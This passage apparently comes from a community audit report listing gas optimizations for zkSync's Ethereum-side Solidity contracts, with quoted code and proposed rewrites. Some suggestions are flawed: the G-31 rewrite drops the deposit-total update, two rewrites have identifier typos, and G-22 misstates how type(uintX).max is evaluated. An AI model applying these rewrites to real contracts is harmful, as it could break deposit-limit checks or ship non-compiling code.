    require(totalDepositedAmountPerUser[msg.sender][msg.sender] + _amount <= 1000, "d1");
    totalDepositedAmountPerUser[msg.sender][msg.sender] += _amount;
    console.log(g - gasleft());
}

function afterFix(uint _amount) public {
    uint g = gasleft();
    totalDepositedAmountPerUser[msg.sender][msg.sender] += _amount;
    require(totalDepositedAmountPerUser[msg.sender][msg.sender]  <= 1000, "d1");
    console.log(g - gasleft());
}
```

Function `current()` uses 5895 gas, while function `afterFix()` uses 5707, which implies, that proposed fix is better optimized for a gas usage.

## [G-16] Unnecessary variables in `LibMap.sol`

**Function `get`:**

Variables `mapValue` and `bitOffset` are used only once, which means they don't need to be declared at all. The code snippet below can be changed from:

[File: ethereum/contracts/zksync/libraries/LibMap.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/libraries/LibMap.sol#L21-L28)

```
uint256 mapValue = _map.map[_index / 8];

// First three bits of the original `_index` denotes the position of the uint32 in that slot.
// So, '(_index & 7) * 32' is done to find the bit position of the uint32 in that storage slot.
uint256 bitOffset = (_index & 7) * 32;

// Shift the bits to the right and retrieve the uint32 value.
result = uint32(mapValue >> bitOffset);
```

To:

```
result = uint32(_map.map[_index / 8] >> ( (_index & 7) * 32));
```

**Function `set`:**

Variables `oldValue` and `nexValueXorOldValue` are used only once, which means they don't need to be declared at all. The code snippet below can be changed from:

[File: ethereum/contracts/zksync/libraries/LibMap.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/libraries/LibMap.sol#L56-L63)

```
            uint32 oldValue = uint32(mapValue >> bitOffset);

            // Calculate the XOR of the new value and the existing value.
            uint256 newValueXorOldValue = uint256(oldValue ^ _value);

            // Finally, we XOR the slot with the XOR of the new value and the existing value,
            // shifted to its proper position. The XOR operation will effectively replace the old value with the new value.
            _map.map[mapIndex] = (newValueXorOldValue << bitOffset) ^ mapValue;
```

To:

```
            _map.map[mapIndex] = (uint256(uint32(mapValue >> bitOffset) ^ _value) << bitOffset) ^ mapValue;
```

## [G-17] Division by powers of two should use bit shifting in `Merkle.sol`

While the bot report reported every division by powers of two in a form: `A / 2`, it misses an instance, which looks like: `A /= 2`.

[File: ethereum/contracts/zksync/libraries/Merkle.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/libraries/Merkle.sol#L33)

```
_index /= 2;
```

It should be changed to: `_index = _index >> 1;`.

## [G-18] Precalculate constants in `Config.sol`.

While constants have known value, to save more gas, calculate their values before compile-time.

[File: ethereum/contracts/zksync/Config.sol](https://github.com/code-423n4/2023-10-zksync/blob/main/code/contracts/ethereum/contracts/zksync/Config.sol)

```
uint256 constant MAX_L2_TO_L1_LOGS_COMMITMENT_BYTES = 4 + L2_TO_L1_LOG_SERIALIZE_SIZE * 512
uint256 constant MAX_INITIAL_STORAGE_CHANGES_COMMITMENT_BYTES = 4 + INITIAL_STORAGE_CHANGE_SERIALIZE_SIZE * 4765;
uint256 constant MAX_REPEATED_STORAGE_CHANGES_COMMITMENT_BYTES = 4 + REPEATED_STORAGE_CHANGE_SERIALIZE_SIZE * 7564;
```

## [G-19] Function `pushBack` in `PriorityQueue.sol` can be optimized

[File: ethereum/contracts/zksync/libraries/PriorityQueue.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/libraries/PriorityQueue.sol#L55-L61)

```
    function pushBack(Queue storage _queue, PriorityOperation memory _operation) internal {
        // Save value into the stack to avoid double reading from the storage
        uint256 tail = _queue.tail;

        _queue.data[tail] = _operation;
        _queue.tail = tail + 1;
    }
```

The above function can be optimized by utilizing post-incrementing feature. It will allow to remove `tail` variable. Function won't be creating and reading from that variable:

```
    function pushBack(Queue storage _queue, PriorityOperation memory _operation) internal {
        // Save value into the stack to avoid double reading from the storage
        _queue.data[_queue.tail++] = _operation;
        
    }
```

## [G-20] Remove local-testing related code in `DiamondInit.sol`

[File: ethereum/contracts/zksync/DiamondInit.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/DiamondInit.sol#L85-L87)

```
        // While this does not provide a protection in the production, it is needed for local testing
        // Length of the L2Log encoding should not be equal to the length of other L2Logs' tree nodes preimages
        assert(L2_TO_L1_LOG_SERIALIZE_SIZE != 2 * 32);
```

According to the above code, `assert(L2_TO_L1_LOG_SERIALIZE_SIZE != 2 * 32);` is redundant and can be removed in production, since this line of code is dedicated for local testing only.

This can be confirmed in file `ethereum/contracts/zksync/Config.sol`, where constant `L2_TO_L1_LOG_SERIALIZE_SIZE` is defined as `88`. Since this is a constant value, its value will never change, thus this `assert` is unnecessary and can be removed.

## [G-21] Length of `_encoded` is calculated twice in `validateL1ToL2Transaction` in `TransactionValidator.sol`.

Calculating length is gas-costly operation. It's better to calculate it once and store it in local variable.

[File: ethereum/contracts/zksync/libraries/TransactionValidator.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/libraries/TransactionValidator.sol#L23-L43)

```
        uint256 l2GasForTxBody = getTransactionBodyGasLimit(
            _transaction.gasLimit,
            _transaction.gasPerPubdataByteLimit,
            _encoded.length
        );

(...)
        require(
            getMinimalPriorityTransactionGasLimit(
                _encoded.length,
                _transaction.factoryDeps.length,
                _transaction.gasPerPubdataByteLimit
            ) <= _transaction.gasLimit,
            "up"
        );
```

`_encoded.length` is being calculated twice - in line 26 and line 38.

## [G-22] Use constants instead of `type(uintX).max` in `TransactionValidator.sol`

When you use `type(uintX).max`, it may result in higher gas costs because it involves a runtime operation to calculate the `type(uintX).max` at runtime. This calculation is performed every time the expression is evaluated.

To save gas, it is recommended to use constants to represent the maximum value. Declaration of a constant with the maximum value means that the value is known at compile-time and does not require any runtime calculations.

[File: ethereum/contracts/zksync/libraries/TransactionValidator.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/libraries/TransactionValidator.sol#L50-L55)

```
        require(_transaction.from <= type(uint16).max, "ua");
        require(_transaction.to <= type(uint160).max, "ub");
        require(_transaction.paymaster == 0, "uc");
        require(_transaction.value == 0, "ud");
        require(_transaction.reserved[0] == 0, "ue");
        require(_transaction.reserved[1] <= type(uint160).max, "uf");
```

## [G-23] Multiple adding operations can be reduced in `getMinimalPriorityTransactionGasLimit` in `TransactionValidator.sol`

[File: ethereum/contracts/zksync/libraries/TransactionValidator.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/libraries/TransactionValidator.sol#L69-L102)

```
                costForComputation = L1_TX_INTRINSIC_L2_GAS;
(...)
            costForComputation += Math.ceilDiv(_encodingLength * L1_TX_DELTA_544_ENCODING_BYTES, 544);
(...)
            costForComputation += _numberOfFactoryDependencies * L1_TX_DELTA_FACTORY_DEPS_L2_GAS;
(...)
            costForComputation = Math.max(costForComputation, L1_TX_MIN_L2_GAS_BASE);
(...)
            costForPubdata = L1_TX_INTRINSIC_PUBDATA * _l2GasPricePerPubdata;
(...)
            costForPubdata += _numberOfFactoryDependencies * L1_TX_DELTA_FACTORY_DEPS_PUBDATA * _l2GasPricePerPubdata;
```

There's no need to perform multiple `costForComputation +=`, when it can be calculated at once:

```
costForComputation = L1_TX_INTRINSIC_L2_GAS +  Math.ceilDiv(_encodingLength * L1_TX_DELTA_544_ENCODING_BYTES, 544) + _numberOfFactoryDependencies * L1_TX_DELTA_FACTORY_DEPS_L2_GAS;
costForComputation = Math.max(costForComputation, L1_TX_MIN_L2_GAS_BASE);
```

The whole function can be rewritten to:

```
  function getMinimalPriorityTransactionGasLimit(
        uint256 _encodingLength,
        uint256 _numberOfFactoryDependencies,
        uint256 _l2GasPricePerPubdata
    ) internal pure returns (uint256) {
        return Math.max(L1_TX_INTRINSIC_L2_GAS + Math.ceilDiv(_encodingLength * L1_TX_DELTA_544_ENCODING_BYTES, 544) + _numberOfFactoryDependencies * L1_TX_DELTA_FACTORY_DEPS_L2_GAS, L1_TX_MIN_L2_GAS_BASE) + (L1_TX_INTRINSIC_PUBDATA * _l2GasPricePerPubdata + _numberOfFactoryDependencies * L1_TX_DELTA_FACTORY_DEPS_PUBDATA * _l2GasPricePerPubdat);
    }
```

## [G-24] Unnecessary variables in `TransactionValidator.sol`

**Function `getOverheadForTransaction`:**

Variables `txSlotOverhead`, `overheadForLength`, `numerator` and `denominator` are used only once, which means they don't need to be declared at all. The code snippet below can be changed from:

[File: ethereum/contracts/zksync/libraries/TransactionValidator.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/libraries/TransactionValidator.sol#L141-L165)

```
uint256 txSlotOverhead = Math.ceilDiv(batchOverheadGas, MAX_TRANSACTIONS_IN_BATCH);
batchOverheadForTransaction = Math.max(batchOverheadForTransaction, txSlotOverhead);

// The overhead for occupying the bootloader memory can be derived from encoded_len
uint256 overheadForLength = Math.ceilDiv(_encodingLength * batchOverheadGas, BOOTLOADER_TX_ENCODING_SPACE);
batchOverheadForTransaction = Math.max(batchOverheadForTransaction, overheadForLength);

(...)

uint256 numerator = batchOverheadGas * _totalGasLimit + L2_TX_MAX_GAS_LIMIT;
uint256 denominator = L2_TX_MAX_GAS_LIMIT + batchOverheadGas;

overheadForGas = (numerator - 1) / denominator;
```

To:

```
batchOverheadForTransaction = Math.max(batchOverheadForTransaction, Math.ceilDiv(batchOverheadGas, MAX_TRANSACTIONS_IN_BATCH));

// The overhead for occupying the bootloader memory can be derived from encoded_len

batchOverheadForTransaction = Math.max(batchOverheadForTransaction, Math.ceilDiv(_encodingLength * batchOverheadGas, BOOTLOADER_TX_ENCODING_SPACE));

(...)

overheadForGas = (batchOverheadGas * _totalGasLimit + L2_TX_MAX_GAS_LIMIT - 1) / (L2_TX_MAX_GAS_LIMIT + batchOverheadGa);
```

## [G-25] Unnecessary variables in `Getters.sol`

**Function `isFacetFreezable`:**

Variables `selectorsArrayLen` and `selector0` are used only once, which means they don't need to be declared at all. The code snippet below can be changed from:

[File: ethereum/contracts/zksync/facets/Getters.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Getters.sol#L140-L143)

```
 uint256 selectorsArrayLen = ds.facetToSelectors[_facet].selectors.length;
        if (selectorsArrayLen != 0) {
            bytes4 selector0 = ds.facetToSelectors[_facet].selectors[0];
            isFreezable = ds.selectorToFacet[selector0].isFreezable;
```

To:

```
        if (ds.facetToSelectors[_facet].selectors.length != 0) {
            isFreezable = ds.selectorToFacet[ds.facetToSelectors[_facet].selectors[0]].isFreezable;
```

## [G-26] Unnecessary variables in `Diamond.sol`

**Function `diamondCut`:**

Variables `facet` and `isFacetFreezable` are used only once, which means they don't need to be declared at all. The code snippet below can be changed from:

[File: ethereum/contracts/zksync/libraries/Diamond.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/libraries/Diamond.sol#L101-L113)

```
 Action action = facetCuts[i].action;
            address facet = facetCuts[i].facet;
            bool isFacetFreezable = facetCuts[i].isFreezable;
            bytes4[] memory selectors = facetCuts[i].selectors;

            require(selectors.length > 0, "B"); // no functions for diamond cut

            if (action == Action.Add) {
                _addFunctions(facet, selectors, isFacetFreezable);
            } else if (action == Action.Replace) {
                _replaceFunctions(facet, selectors, isFacetFreezable);
            } else if (action == Action.Remove) {
                _removeFunctions(facet, selectors);
```

To:

```
 Action action = facetCuts[i].action;
            bytes4[] memory selectors = facetCuts[i].selectors;

            require(selectors.length > 0, "B"); // no functions for diamond cut

            if (action == Action.Add) {
                _addFunctions(facetCuts[i].facet, selectors, facetCuts[i].isFreezable);
            } else if (action == Action.Replace) {
                _replaceFunctions(facetCuts[i].facet, selectors, facetCuts[i].isFreezable);
            } else if (action == Action.Remove) {
                _removeFunctions(facetCuts[i].facet, selectors);
```

**Function `_saveFacetIfNew`:**

Variable `selectorsLength` is used only once, which means it doesn't need to be declared at all. The code snippet below can be changed from:

[File: ethereum/contracts/zksync/libraries/Diamond.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/libraries/Diamond.sol#L193-L195)

```
uint256 selectorsLength = ds.facetToSelectors[_facet].selectors.length;
        // If there are no selectors associated with facet then save facet as new one
        if (selectorsLength == 0) {
```

To:

```
if (ds.facetToSelectors[_facet].selectors.length == 0) {
```


**Function `_addOneFunction`:**

Variable `selector0` is used only once, which means it doesn't need to be declared at all. The code snippet below can be changed from:

[File: ethereum/contracts/zksync/libraries/Diamond.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/libraries/Diamond.sol#L219-L220)

```
 bytes4 selector0 = ds.facetToSelectors[_facet].selectors[0];
            require(_isSelectorFreezable == ds.selectorToFacet[selector0].isFreezable, "J1");
```

To:

```

            require(_isSelectorFreezable == ds.selectorToFacet[ds.facetToSelectors[_facet].selectors[0]].isFreezable, "J1");
```

## [G-27] Function `diamondCut()` from `Diamond.sol` can be redesigned to revert earlier

[File: ethereum/contracts/zksync/libraries/Diamond.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/libraries/Diamond.sol#L101-L106)

```
101:    Action action = facetCuts[i].action;
102:    address facet = facetCuts[i].facet;
103:    bool isFacetFreezable = facetCuts[i].isFreezable;
104:    bytes4[] memory selectors = facetCuts[i].selectors;
105:
106:    require(selectors.length > 0, "B"); // no functions for diamond cut
```

You can check selectors' length earlier. If their length is `0`, then the function will revert without wasting gas on executing lines: 101-103. 

Change the above code to:

```
bytes4[] memory selectors = facetCuts[i].selectors;
require(selectors.length > 0, "B"); // no functions for diamond cut
Action action = facetCuts[i].action;
address facet = facetCuts[i].facet;
bool isFacetFreezable = facetCuts[i].isFreezable;
```

## [G-28] In `Diamond.sol`, move some `require` on top of function

Functions `_addFunctions`, `_replaceFunctions`, `removeFunctions`, firstly gets the pointer to the diamond storage: `DiamondStorage storage ds = getDiamondStorage();` and then, they perform a check, if a user passed a proper `_facet` address. Those lines can, however, be swapped. If a user provides incorrect `_facet`, then the function should immediately revert. Afterward, it should get the pointer to the diamond storage.

In `_addFunctions()`, change:

```
DiamondStorage storage ds = getDiamondStorage();
require(_facet != address(0), "G"); // facet with zero address cannot be added
```

To:

```
require(_facet != address(0), "G"); // facet with zero address cannot be added
DiamondStorage storage ds = getDiamondStorage();
```

In `_replaceFunctions`, change:

```
DiamondStorage storage ds = getDiamondStorage();
require(_facet != address(0), "K"); // cannot replace facet with zero address
```

To:

```
require(_facet != address(0), "K"); // cannot replace facet with zero address
DiamondStorage storage ds = getDiamondStorage();
```

In `_removeFunctions`, change:

```
DiamondStorage storage ds = getDiamondStorage();
require(_facet == address(0), "a1"); // facet address must be zero
```

To:

```
require(_facet == address(0), "a1"); // facet address must be zero
DiamondStorage storage ds = getDiamondStorage();
```

## [G-29]  In `Diamond.sol` in `_initializeDiamondCut()`, order of `require` can be changed

[File: ethereum/contracts/zksync/libraries/Diamond.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/libraries/Diamond.sol#L302-L303)

```
require(data.length == 32, "lp");
require(abi.decode(data, (bytes32)) == DIAMOND_INIT_SUCCESS_RETURN_VALUE, "lp1");
```

The order of `require` can be changed, firstly check if `abi.decode` is `DIAMOND_INIT_SUCCESS_RETURN_VALUE`, then check its length:

```
require(abi.decode(data, (bytes32)) == DIAMOND_INIT_SUCCESS_RETURN_VALUE, "lp1");
require(data.length == 32, "lp");
```

It will save some gas in multiple scenarios:

- When `data.length < 32` - decoding will revert and there will be no need to execute `require(data.length == 32, "lp");`.
- When `data.length > 32`, but first 32 bytes of `data` are not `DIAMOND_INIT_SUCCESS_RETURN_VALUE` - comparison will revert and there will be no need to execute `require(data.length == 32, "lp");`.

## [G-30] Unnecessary variables in `Mailbox.sol`

**Function `_proveL2LogInclusion`:**

Variables `calculatedRootHash` and `actualRootHash` are used only once, which means they don't need to be declared at all. The code snippet below can be changed from:

[File: ethereum/contracts/zksync/facets/Mailbox.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Mailbox.sol#L142-L145)

```
bytes32 calculatedRootHash = Merkle.calculateRoot(_proof, _index, hashedLog);
        bytes32 actualRootHash = s.l2LogsRootHashes[_batchNumber];

        return actualRootHash == calculatedRootHash;
```

To:

```
return s.l2LogsRootHashes[_batchNumber] == Merkle.calculateRoot(_proof, _index, hashedLog);
```

**Function `l2TransactionBaseCost`:**

Variable `l2GasPrice ` is used only once, which means it doesn't need to be declared at all. The code snippet below can be changed from:

[File: ethereum/contracts/zksync/facets/Mailbox.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Mailbox.sol#L171-L172)

```
        uint256 l2GasPrice = _deriveL2GasPrice(_gasPrice, _l2GasPerPubdataByteLimit);
        return l2GasPrice * _l2GasLimit;
```

To:

```
return _deriveL2GasPrice(_gasPrice, _l2GasPerPubdataByteLimit) * _l2GasLimit;
```

**Function `_deriveL2GasPrice`:**

Variables `pubdataPriceETH` and `minL2GasPriceETH` are used only once, which means they don't need to be declared at all. The code snippet below can be changed from:

[File: ethereum/contracts/zksync/facets/Mailbox.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Mailbox.sol#L180-L183)

```
        uint256 pubdataPriceETH = L1_GAS_PER_PUBDATA_BYTE * _l1GasPrice;
        uint256 minL2GasPriceETH = (pubdataPriceETH + _gasPricePerPubdata - 1) / _gasPricePerPubdata;

        return Math.max(FAIR_L2_GAS_PRICE, minL2GasPriceETH);
```

To:

```
        return Math.max(FAIR_L2_GAS_PRICE, (L1_GAS_PER_PUBDATA_BYTE * _l1GasPrice + _gasPricePerPubdata - 1) / _gasPricePerPubdata);
```

**Function `_requestL2Transaction`:**

Variables `expirationTimestamp`, `txId`, `baseCost` are used only once, which means they don't need to be declared at all. The code snippet below can be changed from:

[File: ethereum/contracts/zksync/facets/Mailbox.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Mailbox.sol#L283-L328)

```
uint64 expirationTimestamp = uint64(block.timestamp + PRIORITY_EXPIRATION); // Safe to cast
uint256 txId = s.priorityQueue.getTotalPriorityTxs();

(...)

uint256 baseCost = params.l2GasPrice * _l2GasLimit;
require(msg.value >= baseCost + _l2Value, "mv"); // The `msg.value` doesn't cover the transaction cost

(...)

params.sender = _sender;
params.txId = txId;
params.l2Value = _l2Value;
params.contractAddressL2 = _contractAddressL2;
params.expirationTimestamp = expirationTimestamp;
params.l2GasLimit = _l2GasLimit;
params.l2GasPricePerPubdata = _l2GasPerPubdataByteLimit;
params.valueToMint = msg.value;
params.refundRecipient = refundRecipient;
```

To:

```
require(msg.value >= params.l2GasPrice * _l2GasLimit + _l2Value, "mv"); // The `msg.value` doesn't cover the transaction cost

(...)

params.sender = _sender;
params.txId = s.priorityQueue.getTotalPriorityTxs();
params.l2Value = _l2Value;
params.contractAddressL2 = _contractAddressL2;
params.expirationTimestamp = uint64(block.timestamp + PRIORITY_EXPIRATION);
params.l2GasLimit = _l2GasLimit;
params.l2GasPricePerPubdata = _l2GasPerPubdataByteLimit;
params.valueToMint = msg.value;
params.refundRecipient = refundRecipient;
```

## [G-31] Reduce number of additions and readings of `s.totalDepositedAmountPerUser[_depositor]` in `_verifyDepositLimit()` in `Mailbox.sol`

[File: ethereum/contracts/zksync/facets/Mailbox.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Mailbox.sol#L279-L280)

```
        require(s.totalDepositedAmountPerUser[_depositor] + _amount <= limitData.depositCap, "d2");
        s.totalDepositedAmountPerUser[_depositor] += _amount;
```

There's no need to access `s.totalDepositedAmountPerUser[_depositor]` twice and perform addition two times. Much cheaper solution would be to cache `s.totalDepositedAmountPerUser[_depositor] + _amount`.
Code can be rewritten to:

```
uint256 totalDepositedAmountPerUserAndAmount = s.totalDepositedAmountPerUser[_depositor] + _amount;
require(totalDepositedAmountPerUserAndAmount <= limitData.depositCap, "d2");
```

We've cached `s.totalDepositedAmountPerUser[_depositor] + _amount`, and then later checked if it does not exceed limit. If it does, the function will revert.

## [G-32] Operations which won't overflow in `Mailbox.sol` can be unchecked

If, for any reason recommendation for G-31 won't be implemented, another gas optimization would be insert line 280: `s.totalDepositedAmountPerUser[_depositor] += _amount;` into unchecked block.

Since `require(s.totalDepositedAmountPerUser[_depositor] + _amount <= limitData.depositCap, "d2");` guarantees that  `s.totalDepositedAmountPerUser[_depositor] + _amount` won't overflow, we can perform 2nd addition as unchecked: `unchecked {s.totalDepositedAmountPerUser[_depositor] += _amount;}`.

## [G-33] Addition in `_requestL2Transaction` in `Mailbox.sol` can be either removed or unchecked.

[File: ethereum/contracts/zksync/facets/Mailbox.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Mailbox.sol#L295)

```
uint64 expirationTimestamp = uint64(block.timestamp + PRIORITY_EXPIRATION); // Safe to cast
```

Constant `PRIORITY_EXPIRATION` is defined in `ethereum/contracts/zksync/Config.sol` as:

```
/// NOTE: The constant is set to zero for the Alpha release period
uint256 constant PRIORITY_EXPIRATION = 0 days;
```

This addition is then redundant (since we're adding `0`). However, if for further reference you want to keep this code as it is (e.g. new contract will be deployed with different Alpha release period), make this operation `unchecked` at least. Since `PRIORITY_EXPIRATION` is a constant value, known during compiling time, and `block.timestamp` is impossible to overflow, it's safe to assume, that `block.timestamp + PRIORITY_EXPIRATION` will never overflow. The max value of `uint64` converted into timestamp is `Sun Jul 21 2554`. It's almost impossible that `block.timestamp + PRIORITY_EXPIRATION` will ever exceed that number (assuming that `PRIORITY_EXPIRATION` will be set to some reasonable value).

## [G-34] Do not assign `offset` in the last call of `UnsafeBytes.readUint256()` in `Mailbox.sol`

A simple test in Remix IDE has been created, to compare gas usage of assigning more than one value from function call:

```
  function getUints() public pure returns (uint, uint) {return (1, 2);}
   function getAll() public view {
    uint a; uint b; 
    (a, b) = getUints();
    uint g = gasleft();
    (a, b) = getUints();
    console.log(g - gasleft());
   }
    function getOne() public view {
    uint a; uint b; 
    (a, b) = getUints();
    uint g = gasleft();
    (a, ) = getUints();
    console.log(g - gasleft());
   }
```

`getOne()` costs 74 gas, while `getAll()` costs 82 gas. This implies, that we shouldn't assign every parameter from function call if it's not needed.

In the last call of `UnsafeBytes.readUint256(_message, offset)` (line 427):

[File: ethereum/contracts/zksync/facets/Mailbox.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Mailbox.sol#L427)

```
(amount, offset) = UnsafeBytes.readUint256(_message, offset);
```

We won't need `offset` anymore, thus we can change line 427 to: `(amount, ) = UnsafeBytes.readUint256(_message, offset);`.

## [G-35] Loop in `_commitBatchesWithSystemContractsUpgrade()` in `Executor.sol` can be optimized

[File: ethereum/contracts/zksync/facets/Executor.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Executor.sol#L241-L243)

```
        for (uint256 i = 0; i < _newBatchesData.length; i = i.uncheckedInc()) {
            // The upgrade transaction must only be included in the first batch.
            bytes32 expectedUpgradeTxHash = i == 0 ? _systemContractUpgradeTxHash : bytes32(0);
```

The `for` loop iterates from `0` to `_newBatchesData.length`. In every iterations (at line 243), it checks if `i == 0`. However, this condition occurs only during the first loop iteration.
This means, that it will be better to divide the loop into two smaller loops:
- `for (uint256 i = 0; i < 1; i = i.uncheckedInc()) { bytes32 expectedUpgradeTxHash =  _systemContractUpgradeTxHash; (...)`.
- `for (uint256 i = 1; i < _newBatchesData.length; i = i.uncheckedInc()) { bytes32 expectedUpgradeTxHash =  bytes32(0); (...)`.

That way, we will be performing `i == 0` check only during the first loop iteration, thus this comparison will be done at least once.

Moreover, to better optimize these two loops, please make sure to declare `i` counter outside that loops. That way, you won't be redeclaring `i` inside the 2nd loop:

```
uint256 i = 0;
for (i; i < 1; i = i.uncheckedInc()) { 
bytes32 expectedUpgradeTxHash =  _systemContractUpgradeTxHash; 

(...)
}

for (i; i < _newBatchesData.length; i = i.uncheckedInc())
{
    bytes32 expectedUpgradeTxHash =  bytes32(0); 
    (...)
}
```

Additionally, as you can notice, `expectedUpgradeTxHash` is used only once, so it does not need to be declared at all. It can be used directly:

- In the first loop:

```
_lastCommittedBatchData = _commitOneBatch(
                _lastCommittedBatchData,
                _newBatchesData[i],
                _systemContractUpgradeTxHash
            );
```

- In the second loop:

```
_lastCommittedBatchData = _commitOneBatch(
                _lastCommittedBatchData,
                _newBatchesData[i],
                bytes32(0)
            );
```

## [G-36] Calculations which won't underflow/overflow in `Executor.sol` can be unchecked

[File: ethereum/contracts/zksync/facets/Executor.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Executor.sol#L93-L94)

```
require(block.timestamp - COMMIT_TIMESTAMP_NOT_OLDER <= batchTimestamp, "h1"); // New batch timestamp is too small
require(lastL2BlockTimestamp <= block.timestamp + COMMIT_TIMESTAMP_APPROXIMATION_DELTA, "h2"); // The last L2 block timestamp is too big
```

Since `COMMIT_TIMESTAMP_NOT_OLDER` and `COMMIT_TIMESTAMP_APPROXIMATION_DELTA` are constant values, which are known before compilation time, it's reasonable to assume, that they are chosen in a way, which:

- `block.timestamp >= COMMIT_TIMESTAMP_NOT_OLDER`.
- `block.timestamp + COMMIT_TIMESTAMP_APPROXIMATION_DELTA` won't overflow.

If that's the case - those two lines can be unchecked.

## [G-37] Move some `require` checks on top of function in `Executor.sol`

[File: ethereum/contracts/zksync/facets/Executor.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Executor.sol#L317-L327)

```
uint256 currentTotalBatchesVerified = s.totalBatchesVerified;
uint256 committedBatchesLength = _committedBatches.length;

// Save the variable from the storage to memory to save gas
VerifierParams memory verifierParams = s.verifierParams;

// Initialize the array, that will be used as public input to the ZKP
uint256[] memory proofPublicInput = new uint256[](committedBatchesLength);

// Check that the batch passed by the validator is indeed the first unverified batch
require(_hashStoredBatchInfo(_prevBatch) == s.storedBatchHashes[currentTotalBatchesVerified], "t1");
```

`require(_hashStoredBatchInfo(_prevBatch) == s.storedBatchHashes[currentTotalBatchesVerified], "t1");` can be moved up:

```
uint256 currentTotalBatchesVerified = s.totalBatchesVerified;

// Check that the batch passed by the validator is indeed the first unverified batch
require(_hashStoredBatchInfo(_prevBatch) == s.storedBatchHashes[currentTotalBatchesVerified], "t1");

uint256 committedBatchesLength = _committedBatches.length;

// Save the variable from the storage to memory to save gas
VerifierParams memory verifierParams = s.verifierParams;

// Initialize the array, that will be used as public input to the ZKP
uint256[] memory proofPublicInput = new uint256[](committedBatchesLength);
```

That way, when this check reverts, the function won't waste gas on performing other instructions.

## [G-38] Simply unchecked operations can be done directly in the code, instead of being imported from the library

File `ethereum/contracts/common/libraries/UncheckedMath.sol` is a library which implements two simple unchecked functions: `uncheckedInc()` and `uncheckedAdd()`.
Those functions are used across the whole code base, mostly inside loops:

File `ethereum/contracts/zksync/facets/Executor.sol`:

```
209:        for (uint256 i = 0; i < _newBatchesData.length; i = i.uncheckedInc()) {
241:        for (uint256 i = 0; i < _newBatchesData.length; i = i.uncheckedInc()) {
263:        for (uint256 i = 0; i < _nPriorityOps; i = i.uncheckedInc()) {
293:        for (uint256 i = 0; i < nBatches; i = i.uncheckedInc()) {
330:        for (uint256 i = 0; i < committedBatchesLength; i = i.uncheckedInc()) {
```

File `ethereum/contracts/zksync/facets/Mailbox.sol`:

```
395:        for (uint256 i = 0; i < factoryDepsLen; i = i.uncheckedInc()) {
```

File `ethereum/contracts/zksync/libraries/Diamond.sol`:

```
100:        for (uint256 i = 0; i < facetCutsLength; i = i.uncheckedInc()) {
138:        for (uint256 i = 0; i < selectorsLength; i = i.uncheckedInc()) {
159:        for (uint256 i = 0; i < selectorsLength; i = i.uncheckedInc()) {
179:        for (uint256 i = 0; i < selectorsLength; i = i.uncheckedInc()) {
```

File `ethereum/contracts/zksync/facets/Getters.sol`:

```
182:        for (uint256 i = 0; i < facetsLen; i = i.uncheckedInc()) {
```

